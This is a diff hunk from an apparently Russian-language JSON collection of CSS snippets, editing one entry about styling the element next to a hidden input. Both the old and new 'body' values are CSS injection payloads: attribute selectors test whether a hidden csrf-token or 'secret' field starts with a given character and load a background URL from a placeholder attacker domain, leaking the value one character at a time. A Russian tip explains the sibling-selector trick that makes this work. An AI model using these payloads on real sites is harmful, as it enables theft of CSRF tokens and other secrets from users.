@@ -68,7 +68,7 @@
       "title": "Скрытые input — стилизуем соседний элемент",
       "language": "css",
       "tags": ["selectors", "hidden-input", "sibling"],
-      "body": "input[name=\"csrf-token\"][value^=\"a\"] + input {\n  background: url(https://[ATTACKER.DOMAIN.TLD]/?q=a)\n}",
+      "body": "/* hidden input сам не рендерится -> красим первый ВИДИМЫЙ соседний элемент через + */\ninput[name=\"secret\"][value^=\"a\"] + * {\n  background: url(https://[ATTACKER.DOMAIN.TLD]/leak?c=a)\n}",
       "meta": {
         "tip": "К hidden input нельзя применить background-image напрямую. Используй соседний селектор (+ или ~), чтобы застилизовать видимый элемент, идущий после скрытого input."
       }
